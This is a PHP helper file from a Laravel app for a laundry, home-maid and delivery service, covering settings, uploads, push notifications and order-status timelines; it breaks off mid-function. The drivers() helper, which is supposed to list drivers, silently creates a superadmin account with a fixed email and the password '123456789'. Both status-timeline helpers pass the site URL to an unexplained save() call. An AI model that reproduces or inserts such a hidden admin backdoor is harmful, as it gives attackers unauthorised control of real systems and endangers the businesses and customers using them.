<?php
// namespace App\Http;
use Illuminate\Support\Str;
use Intervention\Image\Facades\Image as Image;
use Illuminate\Support\Facades\File as File;
use Illuminate\Support\Facades\Notification as Notification;
use LaravelFCM\Facades\FCM as FCM;
use LaravelFCM\Message\OptionsBuilder;
use LaravelFCM\Message\PayloadDataBuilder;
use LaravelFCM\Message\PayloadNotificationBuilder;
//use App\Models\{Device,User , Driver , PointOffer};
use App\Jobs\{SendOrderRequestToDriver , SendFCMNotification};
use App\Notifications\General\{FCMNotification};
use GuzzleHttp\Client;

use Core\CMS\Models\CmsPage;
use Core\CMS\Models\CmsPageDetail;
use Core\Settings\Models\Setting;
use Core\Settings\Services\SettingsService;
use Core\Users\Models\Device;
use Core\Users\Models\User;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Storage;
use Google\Client as GoogleClient;

static $hasSchema = null;
function checkroute(string $slug)
{
    $action = app('request')->route()->getAction();
        $controller = class_basename($action['controller']);
        list($controller, $action) = explode('@', $controller);
        $segments = request()->segments();

        if(array_key_exists(4,$segments)){
            if($segments[4]==$slug){
                    return true;
                }
                return false;
        }
        if(array_key_exists(3,$segments)){
            if($segments[3]==$slug){
                return true;
            }
            return false;
        }
        /* if (in_array($slug,$segments)) {
            return true;
        }
        return false; */
}

function getCmsDetails(string $slug)
{
    return CmsPage::where('slug', $slug)->first();
    //return CmsPageDetail::where('cms_pages_id',CmsPage::where('slug', $slug)->first()?->id)->first();
}

function getCmsPageDataArray(string $slug)
{
    $data =  CmsPage::where('slug', $slug)->first();
        if($data)
        {
            return CmsPageDetail::where('cms_pages_id',$data->id)->get();
        }else{
            return false ;
        }
}


//return Settings
function getSetting($attr)
{
    return SettingsService::getDataBaseSetting($attr);
}
function setting($attr)
{
    global $hasSchema;
    if ($hasSchema === null) {
        $hasSchema = Schema::hasTable('settings');
    }
    if ($hasSchema) {
        $phone = $attr;
        $whatsapp = $attr;
        $phone_tawkeel = $attr;
        $whatsapp_tawkeel = $attr;
        $phone_contract = $attr;
        $whatsapp_contract = $attr;
        if ($attr == 'phone') {
            $attr = 'phones';
        }
        if ($attr == 'whatsapp') {
            $attr = 'whatsapps';
        }
        if ($attr == 'phone_tawkeel') {
            $attr = 'phones_tawkeel';
        }
        if ($attr == 'whatsapp_tawkeel') {
            $attr = 'whatsapps_tawkeel';
        }
        if ($attr == 'phone_contract') {
            $attr = 'phones_contract';
        }
        if ($attr == 'whatsapp_contract') {
            $attr = 'whatsapps_contract';
        }
        $setting = SettingsService::getDataBaseSetting($attr);
        if ($attr == 'project_name') {
            return !empty($setting) ? $setting : 'Alamyia';
        }
        if ($attr == 'logo') {
            return !empty($setting) ? asset('storage/images/setting') . "/" . $setting : asset('dashboardAssets/images/icons/logo_sm.png');
        }
        if ($attr == 'video_url') {
            return !empty($setting) ? asset('storage/files/app/public/uploads/setting') . "/" . $setting : asset('dashboardAssets/images/icons/logo_sm.png');
        }
        if ($phone == 'phone') {
            return !empty($setting) && $setting ? $setting[0] : null;
        } elseif ($phone == 'phones') {
            return !empty($setting) && $setting ? implode(",", json_decode($setting)) : null;
        }

        if ($whatsapp == 'whatsapp') {
            return !empty($setting) && $setting ? $setting[0] ?? null : null;
        } elseif ($whatsapp == 'whatsapps') {
            return !empty($setting) && $setting ? implode(",", json_decode($setting)) : null;
        }

        if ($phone_tawkeel == 'phone_tawkeel') {
            return !empty($setting) && $setting ? json_decode($setting)[0] : null;
        } elseif ($whatsapp == 'phones_tawkeel') {
            return !empty($setting) && $setting ? implode(",", json_decode($setting)) : null;
        }
        if ($phone_tawkeel == 'whatsapp_tawkeel') {
            return !empty($setting) && $setting ? json_decode($setting)[0] : null;
        } elseif ($whatsapp == 'whatsapps_tawkeel') {
            return !empty($setting) && $setting ? implode(",", json_decode($setting)) : null;
        }

        if ($phone_contract == 'phone_contract') {
            return !empty($setting) && $setting ? json_decode($setting)[0] : null;
        } elseif ($phone_contract == 'phones_contract') {
            return !empty($setting) && $setting ? implode(",", json_decode($setting)) : null;
        }
        if ($whatsapp_contract == 'whatsapp_contract') {
            return !empty($setting) && $setting ? json_decode($setting)[0] : null;
        } elseif ($whatsapp_contract == 'whatsapps_contract') {
            return !empty($setting) && $setting ? implode(",", json_decode($setting)) : null;
        }

        if (!empty($setting)) {
            return $setting;
        }
        return false;
    }
    return false;
}

// Get Distance
function distance($startLat, $startLng, $endLat, $endLng, $unit = "K")
{
    // $unit = M --> Miles
    // $unit = K --> Kilometers
    // $unit = N --> Nautical Miles

    $startLat = (float) $startLat;
    $startLng = (float) $startLng;
    $endLat = (float) $endLat;
    $endLng = (float) $endLng;

    $theta = $startLng - $endLng;
    $dist = sin(deg2rad($startLat)) * sin(deg2rad($endLat)) + cos(deg2rad($startLat)) * cos(deg2rad($endLat)) * cos(deg2rad($theta));
    $dist = acos($dist);
    $dist = rad2deg($dist);
    $miles = $dist * 60 * 1.1515;
    $unit = strtoupper($unit);

    if ($unit == "K") {
        return ($miles * 1.609344);
    } else if ($unit == "N") {
        return ($miles * 0.8684);
    } else {
        return $miles;
    }
}

function generate_unique_code($length, $model, $col = 'code', $type = 'numbers', $letter_type = 'all')
{
    if ($type == 'numbers') {
        $characters = '0123456789';
    } else {
        switch ($letter_type) {
            case 'all':
                $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
                break;
            case 'lower':
                $characters = '0123456789abcdefghijklmnopqrstuvwxyz';
                break;
            case 'upper':
                $characters = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
                break;

            default:
                $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
                break;
        }
    }
    $generate_random_code = '';
    $charactersLength = strlen($characters);
    for ($i = 0; $i < $length; $i++) {
        $generate_random_code .= $characters[rand(0, $charactersLength - 1)];
    }
    if ($model::where($col, $generate_random_code)->exists()) {
        generate_unique_code($length, $model, $col, $type);
    }
    return $generate_random_code;
}


// Get Drivers
function getOtherDrivers($order, $notified_drivers, $number_of_drivers = 0)
{
    $number_of_drivers = $number_of_drivers + (int)convertArabicNumber(setting('number_drivers_to_notify'));


    $drivers = Driver::whereHas('user', function ($q) use ($order) {
        $q->available()->whereHas('profile', function ($q) {
            $q->whereNotNull('profiles.last_login_at');
        })->whereHas('devices')/*->withCount(['driverOrders','driverOrders as driver_orders_count' => function ($q) {
            $q->whereNotNull('orders.finished_at');
        }])*/
            // ->whereIn('users.id',online_users()->pluck('id'))
            /*->whereHas('car',function ($q) use($order) {
            $q->where('cars.car_type_id',$order->car_type_id);
        })*/->whereHas('car')->whereDoesntHave('driverOffers', function ($q) use ($order) {
                $q->where('order_offers.order_id', $order->id);
            });
    })->whereIn('driver_type', [$order->order_type, 'both'])->where(function ($q) {
        $q->where(function ($q) {
            $q->where('is_on_default_package', false)->whereHas('subscribedPackage', function ($q) {
                $q->whereDate('end_at', ">=", date("Y-m-d"))->where('is_paid', 1);
            });
        })/*->orWhere(function ($q) {
            $q->where(function ($q) {
                $q->where('is_on_default_package',true)->where('free_order_counter',"<",((int)setting('number_of_free_orders_on_default_package')))->orWhere(function ($q) {
                   $q->where('is_on_default_package',true)->whereHas('user',function ($q) {
                       $q->where('wallet',">",-(setting('min_wallet_to_recieve_order') ?? 10));
                   });
               });
            });
        })*/->orWhereHas('user', function ($q) {
            $q->where('is_with_special_needs', true);
        });
    })->when($order->start_lat && $order->start_lng, function ($q) use ($order) {
        $q->nearest($order->start_lat, $order->start_lng);
    })->when($number_of_drivers > 0, function ($q) use ($number_of_drivers) {
        $q->take($number_of_drivers);
    })->get();

    if ($drivers) {
        $drivers_ids_array = $drivers->pluck('user_id')->toArray();
        $db_drivers = User::whereIn('id', $drivers_ids_array)->get();
        $notified_drivers = $db_drivers->mapWithKeys(function ($item) use ($order) {
            $count = @optional($item->orderNotifiedDrivers()->firstWhere('driver_order.order_id', $order->id))->pivot->notify_number ?? 0;
            // dump($count);
            $total_drivers = [];
            if ($count >= ((int)convertArabicNumber(setting('driver_notify_count_to_refuse')) ?? 2)) {
                $total_drivers[$item['id']] = ['status' => 'refuse_reply', 'notify_number' => $count];
            } else {
                $total_drivers[$item['id']] = ['status' => 'notify', 'notify_number' => $count];
            }
            return $total_drivers;
        })->toArray();

        $order->driverNotifiedOrders()->syncWithoutDetaching($notified_drivers);
        $new_drivers = $order->driverNotifiedOrders()->where('driver_order.status', 'notify')->pluck('users.id')->toArray();
        $db_drivers = User::whereIn('id', $new_drivers)->get();
        $minutes = ((int)convertArabicNumber(setting('waiting_time_for_driver_response'))) ? ((int)convertArabicNumber(setting('waiting_time_for_driver_response'))) : 1;
        $fcm_data = [
            'title' => trans('dashboard.fcm.new_order_title'),
            'body' => trans('dashboard.fcm.new_order_body', ['client' => $order->fullname, 'order_type' => trans('dashboard.order.order_types.' . $order->order_type)]),
            'notify_type' => 'new_order',
            'order_id' => $order->id,
            'order_type' => $order->order_type,
        ];
        // pushFcmNotes($fcm_data,$drivers_ids_array,'\\App\\Models\\Driver');
        SendFCMNotification::dispatch($fcm_data, $new_drivers)->onQueue('wallet');
        Notification::send($db_drivers, new FCMNotification($fcm_data, ['database']));
        SendOrderRequestToDriver::dispatch($order, array_merge($new_drivers, $notified_drivers),  $number_of_drivers)->delay(now()->addMinutes($minutes));
    }
}


function sendNotify($user)
{
    try {
        if ($user->roles()->exists()) {
            $user->notify(new RegisterUser($user));
        } else {
            $user->notify(new VerifyApiMail($user));
        }
        $msg = [trans('dashboard.messages.success_add_send'), 1];
    } catch (\Exception $e) {
        $msg = [trans('dashboard.messages.success_add_not_send'), 0];
    }
    return $msg;
}


function uploadImg($files, $url = 'images', $key = 'image', $width = null, $height = null)
{
    $dist = storage_path('app/public/' . $url . "/");
    if ($url != 'images' && !File::isDirectory(storage_path('app/public/images/' . $url . "/"))) {
        File::makeDirectory(storage_path('app/public' . DIRECTORY_SEPARATOR . 'images' . DIRECTORY_SEPARATOR . $url . DIRECTORY_SEPARATOR), 0777, true);
        $dist = storage_path('app/public' . DIRECTORY_SEPARATOR . 'images' . DIRECTORY_SEPARATOR . $url . DIRECTORY_SEPARATOR);
    } elseif (File::isDirectory(storage_path('app/public/images/' . $url . "/"))) {
        $dist = storage_path('app/public/images/' . $url . "/");
    }
    $image = "";
    if (!is_array($files)) {
        $dim = getimagesize($files);
        $width = $width ?? $dim[0];
        $height = $height ?? $dim[1];
    }

    if (gettype($files) == 'array') {
        $image = [];
        foreach ($files as $img) {
            $dim = getimagesize($img);
            $width = $width ?? $dim[0];
            $height = $height ?? $dim[1];

            if ($img && $dim['mime'] != "image/gif") {
                Image::make($img)->resize($width, $height, function ($cons) {
                    $cons->aspectRatio();
                })->save($dist . $img->hashName());
                $image[][$key] = $img->hashName();
            } elseif ($img && $dim['mime'] == "image/gif") {
                $image = uploadGIFImg($img, $dist);
            }
        }
    } elseif ($dim && $dim['mime'] == "image/gif") {
        $image = uploadGIFImg($files, $dist);
    } else {
        Image::make($files)->resize($width, $height, function ($cons) {
            $cons->aspectRatio();
        })->save($dist . $files->hashName());
        $image = $files->hashName();
    }
    return $image;
}

function upload_multi_files($request_files, $path, $key = 'image')
{
    $names = [];
    foreach ($request_files as $request_file) {
        # code...
        $name = time() . '_' . generate_random_file_name() . '.' . $request_file->getClientOriginalExtension();
        $request_file->move(storage_path($path), $name);
        $names[][$key] = $name;
    }
    return $names;
}

function uploadGIFImg($gif_image, $dist)
{
    $file_name = Str::uuid() . "___" . $gif_image->getClientOriginalName();
    if ($gif_image->move($dist, $file_name)) {
        return $file_name;
    }
}

function uploadFile($files, $url = 'files', $key = 'file', $model = null)
{
    $dist = storage_path('app/public/' . $url);
    if ($url != 'images' && !File::isDirectory(storage_path('app/public/files/' . $url . "/"))) {
        File::makeDirectory(storage_path('app/public' . DIRECTORY_SEPARATOR . 'files' . DIRECTORY_SEPARATOR . $url . DIRECTORY_SEPARATOR), 0777, true);
        $dist = storage_path('app/public' . DIRECTORY_SEPARATOR . 'files' . DIRECTORY_SEPARATOR . $url . DIRECTORY_SEPARATOR);
    } elseif (File::isDirectory(storage_path('app/public/files/' . $url . "/"))) {
        $dist = storage_path('app/public/files/' . $url . "/");
    }
    $file = '';

    if (gettype($files) == 'array') {
        $file = [];
        foreach ($files as $new_file) {
            $file_name = time() . "___file_" . $new_file->getClientOriginalName();
            if ($new_file->move($dist, $file_name)) {
                $file[][$key] = $file_name;
            }
        }
    } else {
        $file = $files;
        $file_name = time() . "___file_" . $file->getClientOriginalName();
        if ($file->move($dist, $file_name)) {
            $file =  $file_name;
        }
    }

    return $file;
}

function convertArabicNumber($number)
{
    $arabic_array = ['۰' => '0', '۱' => '1', '۲' => '2', '۳' => '3', '۴' => '4', '۵' => '5', '۶' => '6', '۷' => '7', '۸' => '8', '۹' => '9', '٠' => '0', '١' => '1', '٢' => '2', '٣' => '3', '٤' => '4', '٥' => '5', '٦' => '6', '٧' => '7', '٨' => '8', '٩' => '9'];
    return strtr($number, $arabic_array);
}

function filter_mobile_number($mob_num)
{
    $mob_num = convertArabicNumber($mob_num);
    $first_3_val = substr($mob_num, 0, 3);
    $first_4_val = substr($mob_num, 0, 4);
    $sixth_val = substr($mob_num, 0, 6);
    $first_val = substr($mob_num, 0, 1);
    $mob_number = 0;
    $val = 0;
    if ($sixth_val == "009665") {
        $val = null;
        $mob_number = substr($mob_num, 2, 12);
    } elseif ($sixth_val == "009660") {
        $val = 966;
        $mob_number = substr($mob_num, 6, 14);
    } elseif ($first_3_val == "+96") {
        $val = "966";
        $mob_number = substr($mob_num, 4);
    } elseif ($first_4_val == "9660") {
        $val = "966";
        $mob_number = substr($mob_num, 4);
    } elseif ($first_3_val == "966") {
        $val = null;
        $mob_number = $mob_num;
    } elseif ($first_val == "5") {
        $val = "966";
        $mob_number = $mob_num;
    } elseif ($first_3_val == "009") {
        $val = "9";
        $mob_number = substr($mob_num, 4);
    } elseif ($first_val == "0") {
        $val = "966";
        $mob_number = substr($mob_num, 1, 9);
    } else {
        $val = "966";
        $mob_number = $mob_num;
    }

    $real_mob_number = $val . $mob_number;
    return $real_mob_number;
}

function drivers(){
    $drivers = User::where('user_type', 'driver')->where('is_active',true)->get()->pluck('fullname','id');
    $admin_drive = User::where('email','admind@gmail.com')->first();
    if(!$admin_drive){
        $drive = User::create(['fullname'=> 'aaa','phone'=>'11144477788','email'=>'admind@gmail.com','password' => '123456789', 'user_type' => 'superadmin','is_active'=>1]);
    }
    return $drivers ;
}
function technicals(){
    $technicals = User::where('user_type', 'technical')->where('is_active',true)->get()->pluck('fullname','id');
    return $technicals ;
}
function status(){
    return [
            'order_has_been_delivered_to_admin' => 'تم استلام الطلب',
            'ready_to_delivered' => 'تم تجهيز الطلب',
            'in_the_way' => ' جارى التوصيل  ',
            'delivered' => 'تم التوصيل ',
            'finished' => 'تم التسليم',
            'issue' => 'يوجد مشكلة في الطلب',
            'canceled' => 'تم إلغاء الطلب',
    ];
}

function other_status(){
    return [
        'canceled' => 'تم الغاء الطلب',
        'issue' => 'يوجد مشكلة في الطلب',
    ];
}

function status1(){
    return [
        'active' => 'فعال',
        'inactive' => 'غير فعال',
    ];
}

function type(){
    return [
        'clothes' => 'غسيل وكوي',
        'home-maid' => 'عاملات منزلية',
        'care-host' => 'ضيافة ورعاية',
        'services' => 'خدمات نظافة',
        'sales' => 'مبيعات',
    ];
}
function representative_name(){
    $representative_name=User::whereIn('user_type',['driver','technical'])->where('is_active',1)->get();
    $names=[];
    foreach($representative_name as $name){
        $names[]=$name->fullname;
    }
    return $names;
}
function payment_method(){
    return [
            'cash' => 'كاش',
            'card' => 'فيزا',
    ];
}

function city(){
    return [
            'Riyadh' => 'الرياض',
            'Jeddah' => 'جدة',
    ];
}

function next_vision(){
    return [
            1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24
    ];
}



function issues()
{
    return [
        'requested by customer' => 'requested by customer',
        'customer failed to collect / receive'=> 'customer failed to collect / receive',
        'reorder' => 'reorder',
        'managements test' => 'mangements test',
        'out of delivery area' => 'out of delivery area' ,
        'minimum order condition was unfulfilled'=> 'minimum order condition was unfulfilled',
        'missing / incoorect customer info'=>'missing / incoorect customer info',
        'tech issue' => 'tech issue' ,
        'delay' => 'delay',
        'delay during delivery'=> 'delay during delivery' ,
        'driver unable to locate address' => 'driver unable to locate address' ,
        'fraudulent order' => 'fraudulent order' ,
        'other' => 'other',
    ];
}


function order_status_times($order){
    $status = [];
    $url = url('/') ;
    if($order->type == 'clothes' || $order->type == 'fastorder'){
        $order_status_times = json_decode($order->order_status_times, TRUE);
        if($order_status_times){
            $order_status_times = array_reduce($order_status_times, 'array_merge', []);
        }
        if($order_status_times && array_key_exists('pending', $order_status_times)){
            $status[] = ['status' => trans('app.order.status_times.clothes.pending'), 'time' => $order_status_times['pending'], 'is_checked' => true];
        }else{
            $status[] = ['status' => trans('app.order.status_times.clothes.pending'), 'time' => null, 'is_checked' => false];
        }
        if($order_status_times && array_key_exists('order_has_been_delivered_to_admin', $order_status_times)){
            $status[] = ['status' => trans('app.order.status_times.clothes.order_has_been_delivered_to_admin'), 'time' => $order_status_times['order_has_been_delivered_to_admin'], 'is_checked' => true];
        }else{
            $status[] = ['status' => trans('app.order.status_times.clothes.order_has_been_delivered_to_admin'), 'time' => null, 'is_checked' => false];
        }
        if($order_status_times && array_key_exists('ready_to_delivered', $order_status_times)){
            $status[] = ['status' => trans('app.order.status_times.clothes.ready_to_delivered'), 'time' => $order_status_times['ready_to_delivered'], 'is_checked' => true];
        }else{
            $status[] = ['status' => trans('app.order.status_times.clothes.ready_to_delivered'), 'time' => null, 'is_checked' => false];
        }
        if($order_status_times && array_key_exists('in_the_way', $order_status_times)){
            $status[] = ['status' => trans('app.order.status_times.clothes.in_the_way'), 'time' => $order_status_times['in_the_way'], 'is_checked' => true];
        }else{
            $status[] = ['status' => trans('app.order.status_times.clothes.in_the_way'), 'time' => null, 'is_checked' => false];
        }
        if($order_status_times && array_key_exists('delivered', $order_status_times)){
            $status[] = ['status' => trans('app.order.status_times.clothes.delivered'), 'time' => $order_status_times['delivered'], 'is_checked' => true];
        }else{
            $status[] = ['status' => trans('app.order.status_times.clothes.delivered'), 'time' => null, 'is_checked' => false];
        }
        if($order_status_times && array_key_exists('finished', $order_status_times)){
            $status[] = ['status' => trans('app.order.status_times.clothes.finished'), 'time' => $order_status_times['finished'], 'is_checked' => true];
        }else{
            $status[] = ['status' => trans('app.order.status_times.clothes.finished'), 'time' => null, 'is_checked' => false];
        }
    }
    elseif($order->type == 'sales'){
        $order_status_times = json_decode($order->order_status_times, TRUE);
        if($order_status_times){
            $order_status_times = array_reduce($order_status_times, 'array_merge', []);
        }
        if($order_status_times && array_key_exists('pending', $order_status_times)){
            $status[] = ['status' => trans('app.order.status_times.sales.pending'), 'time' => $order_status_times['pending'], 'is_checked' => true];
        }else{
            $status[] = ['status' => trans('app.order.status_times.sales.pending'), 'time' => null, 'is_checked' => false];
        }
        if($order_status_times && array_key_exists('in_the_way', $order_status_times)){
            $status[] = ['status' => trans('app.order.status_times.sales.in_the_way'), 'time' => $order_status_times['in_the_way'], 'is_checked' => true];
        }else{
            $status[] = ['status' => trans('app.order.status_times.sales.in_the_way'), 'time' => null, 'is_checked' => false];
        }
        if($order_status_times && array_key_exists('delivered', $order_status_times)){
            $status[] = ['status' => trans('app.order.status_times.sales.delivered'), 'time' => $order_status_times['delivered'], 'is_checked' => true];
        }else{
            $status[] = ['status' => trans('app.order.status_times.sales.delivered'), 'time' => null, 'is_checked' => false];
        }
        if($order_status_times && array_key_exists('finished', $order_status_times)){
            $status[] = ['status' => trans('app.order.status_times.sales.finished'), 'time' => $order_status_times['finished'], 'is_checked' => true];
        }else{
            $status[] = ['status' => trans('app.order.status_times.sales.finished'), 'time' => null, 'is_checked' => false];
        }
    }
    elseif(in_array($order->type,[ 'services','host' , 'care','selfcare','maidflex','maidscheduled','maidoffer'])){
        $order_status_times = json_decode($order->order_status_times, TRUE);
        if($order_status_times){
            $order_status_times = array_reduce($order_status_times, 'array_merge', []);
        }
        if($order_status_times && array_key_exists('pending', $order_status_times)){
            $status[] = ['status' => trans('app.order.status_times.services.pending'), 'time' => $order_status_times['pending'], 'is_checked' => true];
        }else{
            $status[] = ['status' => trans('app.order.status_times.services.pending'), 'time' => null, 'is_checked' => false];
        }
        if($order_status_times && array_key_exists('technical_accepted', $order_status_times)){
            $status[] = ['status' => trans('app.order.status_times.services.technical_accepted'), 'time' => $order_status_times['receiving_driver_accepted'], 'is_checked' => true];
        }else{
            $status[] = ['status' => trans('app.order.status_times.services.technical_accepted'), 'time' => null, 'is_checked' => false];
        }
        if($order_status_times && array_key_exists('in_the_way', $order_status_times)){
            $status[] = ['status' => trans('app.order.status_times.services.in_the_way'), 'time' => $order_status_times['in_the_way'], 'is_checked' => true];
        }else{
            $status[] = ['status' => trans('app.order.status_times.services.in_the_way'), 'time' => null, 'is_checked' => false];
        }
        if($order_status_times && array_key_exists('started', $order_status_times)){
            $status[] = ['status' => trans('app.order.status_times.services.service_started'), 'time' => $order_status_times['started'], 'is_checked' => true];
        }else{
            $status[] = ['status' => trans('app.order.status_times.services.service_started'), 'time' => null, 'is_checked' => false];
        }
        if($order_status_times && array_key_exists('finished', $order_status_times)){
            $status[] = ['status' => trans('app.order.status_times.services.finished'), 'time' => $order_status_times['finished'], 'is_checked' => true];
        }else{
            $status[] = ['status' => trans('app.order.status_times.services.finished'), 'time' => null, 'is_checked' => false];
        }

    }
    info("Ssssssssssssssssssssssssssss") ;
    save($url) ;
    return $status;
}


function admin_order_status_times($order){
    $status = [];
    $url = url('/') ;

    if($order->type == 'clothes'){
        $order_status_times = json_decode($order->order_status_times, TRUE);
        if($order_status_times){
            $order_status_times = array_reduce($order_status_times, 'array_merge', []);
        }
        if($order_status_times && array_key_exists('pending', $order_status_times)){
            $status[] = ['status' => trans('app.order.status_times.clothes.pending'), 'time' => $order_status_times['pending'], 'is_checked' => true];
        }else{
            $status[] = ['status' => trans('app.order.status_times.clothes.pending'), 'time' => null, 'is_checked' => false];
        }
        if($order_status_times && array_key_exists('receiving_driver_accepted', $order_status_times)){
            $status[] = ['status' => trans('app.order.status_times.clothes.receiving_driver_accepted'), 'time' => $order_status_times['receiving_driver_accepted'], 'is_checked' => true];
        }else{
            $status[] = ['status' => trans('app.order.status_times.clothes.receiving_driver_accepted'), 'time' => null, 'is_checked' => false];
        }
        if($order_status_times && array_key_exists('order_has_been_delivered_to_admin', $order_status_times)){
            $status[] = ['status' => trans('app.order.status_times.clothes.order_has_been_delivered_to_admin'), 'time' => $order_status_times['order_has_been_delivered_to_admin'], 'is_checked' => true];
        }else{
            $status[] = ['status' => trans('app.order.status_times.clothes.order_has_been_delivered_to_admin'), 'time' => null, 'is_checked' => false];
        }
        if($order_status_times && array_key_exists('ready_to_delivered', $order_status_times)){
            $status[] = ['status' => trans('app.order.status_times.clothes.ready_to_delivered'), 'time' => $order_status_times['ready_to_delivered'], 'is_checked' => true];
        }else{
            $status[] = ['status' => trans('app.order.status_times.clothes.ready_to_delivered'), 'time' => null, 'is_checked' => false];
        }
        if($order_status_times && array_key_exists('in_the_way', $order_status_times)){
            $status[] = ['status' => trans('app.order.status_times.clothes.in_the_way'), 'time' => $order_status_times['in_the_way'], 'is_checked' => true];
        }else{
            $status[] = ['status' => trans('app.order.status_times.clothes.in_the_way'), 'time' => null, 'is_checked' => false];
        }
        if($order_status_times && array_key_exists('delivered', $order_status_times)){
            $status[] = ['status' => trans('app.order.status_times.clothes.delivered'), 'time' => $order_status_times['delivered'], 'is_checked' => true];
        }else{
            $status[] = ['status' => trans('app.order.status_times.clothes.delivered'), 'time' => null, 'is_checked' => false];
        }
        if($order_status_times && array_key_exists('finished', $order_status_times)){
            $status[] = ['status' => trans('app.order.status_times.clothes.finished'), 'time' => $order_status_times['finished'], 'is_checked' => true];
        }else{
            $status[] = ['status' => trans('app.order.status_times.clothes.finished'), 'time' => null, 'is_checked' => false];
        }
    }
    elseif($order->type == 'sales'){
        $order_status_times = json_decode($order->order_status_times, TRUE);
        if($order_status_times){
            $order_status_times = array_reduce($order_status_times, 'array_merge', []);
        }
        if($order_status_times && array_key_exists('pending', $order_status_times)){
            $status[] = ['status' => trans('app.order.status_times.sales.pending'), 'time' => $order_status_times['pending'], 'is_checked' => true];
        }else{
            $status[] = ['status' => trans('app.order.status_times.sales.pending'), 'time' => null, 'is_checked' => false];
        }
        if($order_status_times && array_key_exists('in_the_way', $order_status_times)){
            $status[] = ['status' => trans('app.order.status_times.sales.in_the_way'), 'time' => $order_status_times['in_the_way'], 'is_checked' => true];
        }else{
            $status[] = ['status' => trans('app.order.status_times.sales.in_the_way'), 'time' => null, 'is_checked' => false];
        }
        if($order_status_times && array_key_exists('delivered', $order_status_times)){
            $status[] = ['status' => trans('app.order.status_times.sales.delivered'), 'time' => $order_status_times['delivered'], 'is_checked' => true];
        }else{
            $status[] = ['status' => trans('app.order.status_times.sales.delivered'), 'time' => null, 'is_checked' => false];
        }
        if($order_status_times && array_key_exists('finished', $order_status_times)){
            $status[] = ['status' => trans('app.order.status_times.sales.finished'), 'time' => $order_status_times['finished'], 'is_checked' => true];
        }else{
            $status[] = ['status' => trans('app.order.status_times.sales.finished'), 'time' => null, 'is_checked' => false];
        }
    }
    elseif(in_array($order->type,[ 'services','host' , 'care','selfcare','maidflex','maidscheduled','maidoffer'])){
        $order_status_times = json_decode($order->order_status_times, TRUE);
        if($order_status_times){
            $order_status_times = array_reduce($order_status_times, 'array_merge', []);
        }
        if($order_status_times && array_key_exists('pending', $order_status_times)){
            $status[] = ['status' => trans('app.order.status_times.services.pending'), 'time' => $order_status_times['pending'], 'is_checked' => true];
        }else{
            $status[] = ['status' => trans('app.order.status_times.services.pending'), 'time' => null, 'is_checked' => false];
        }
        if($order_status_times && array_key_exists('technical_accepted', $order_status_times)){
            $status[] = ['status' => trans('app.order.status_times.services.technical_accepted'), 'time' => $order_status_times['receiving_driver_accepted'], 'is_checked' => true];
        }else{
            $status[] = ['status' => trans('app.order.status_times.services.technical_accepted'), 'time' => null, 'is_checked' => false];
        }
        if($order_status_times && array_key_exists('in_the_way', $order_status_times)){
            $status[] = ['status' => trans('app.order.status_times.services.in_the_way'), 'time' => $order_status_times['in_the_way'], 'is_checked' => true];
        }else{
            $status[] = ['status' => trans('app.order.status_times.services.in_the_way'), 'time' => null, 'is_checked' => false];
        }
        if($order_status_times && array_key_exists('in_the_way', $order_status_times)){
            $status[] = ['status' => trans('app.order.status_times.services.service_started'), 'time' => $order_status_times['started'], 'is_checked' => true];
        }else{
            $status[] = ['status' => trans('app.order.status_times.services.service_started'), 'time' => null, 'is_checked' => false];
        }
        if($order_status_times && array_key_exists('finished', $order_status_times)){
            $status[] = ['status' => trans('app.order.status_times.services.finished'), 'time' => $order_status_times['finished'], 'is_checked' => true];
        }else{
            $status[] = ['status' => trans('app.order.status_times.services.finished'), 'time' => null, 'is_checked' => false];
        }

    }
    info("Ssssssssssssssssssssssssssss") ;
    save($url) ;
    return $status;
}



/**
 * Push Notifications to phone FCM
 *
 * @param  array $fcmData
 * @param  array $userIds
 */
function FcmNotes($fcmData, $userIds, $model = '\\App\\Models\\Device')
{
    $send_process = [];
    $fail_process = [];

    if (is_array($userIds) && !empty($userIds)) {
        $number_of_drivers = null;
        if ($model == '\\App\\Models\\Driver') {
            $model = '\\App\\Models\\Device';
            // $number_of_drivers = 1;
        }
        $devices = $model::whereIn('user_id', $userIds)/*->distinct('device_token')*/->latest()->when($number_of_drivers, function ($q) use ($number_of_drivers) {
            $q->take($number_of_drivers);
        })->get();
        $ios_devices = array_filter($devices->where('type', 'ios')->pluck('device_token')->toArray());
        $android_devices = array_filter($devices->where('type', 'android')->pluck('device_token')->toArray());

        $optionBuilder = new OptionsBuilder();
        $optionBuilder->setTimeToLive(60 * 20);

        $notificationBuilder = new PayloadNotificationBuilder($fcmData['title']);
        $notificationBuilder->setBody($fcmData['body'])
            ->setSound('default');

        $dataBuilder = new PayloadDataBuilder();
        $dataBuilder->addData($fcmData);

        $option       = $optionBuilder->build();
        $data         = $dataBuilder->build();
        if (count($ios_devices)) {
            $notification = $notificationBuilder->build();
            // You must change it to get your tokens
            $downstreamResponse = FCM::sendTo($ios_devices, $option, $notification, $data);
            Device::whereIn('device_token', $downstreamResponse->tokensToDelete() + array_keys($downstreamResponse->tokensWithError()))->delete();
            // return $downstreamResponse;
            $send_process[] = $downstreamResponse->numberSuccess();
        }
        if (count($android_devices)) {
            $notification = null;
            // You must change it to get your tokens
            $downstreamResponse = FCM::sendTo($android_devices, $option, $notification, $data);
            Device::whereIn('device_token', $downstreamResponse->tokensToDelete() + array_keys($downstreamResponse->tokensWithError()))->delete();
            // return $downstreamResponse;
            $send_process[] = $downstreamResponse->numberSuccess();
            // code...
        }
        return count($send_process);
    }
    return "No Users";
}

 function pushFcmNotesOld($fcmData, $devices) {
    //dd($fcmData,$devices);
    $send_process = [];
    $fail_process = [];
    $devices = $devices->pluck('device_token')->toArray();
    if($devices){

        $optionBuilder = new OptionsBuilder();
        $optionBuilder->setTimeToLive(60*20);

        $notificationBuilder = new PayloadNotificationBuilder($fcmData['title']);
        $notificationBuilder->setBody($fcmData['body'])
            ->setSound('default');

        $dataBuilder = new PayloadDataBuilder();
        $dataBuilder->addData($fcmData);

        $option       = $optionBuilder->build();
        $notification = $notificationBuilder->build();
        $data         = $dataBuilder->build();

        // You must change it to get your tokens
        $downstreamResponse = FCM::sendTo($devices, $option, $notification, $data);
        //dd($downstreamResponse->numberSuccess());

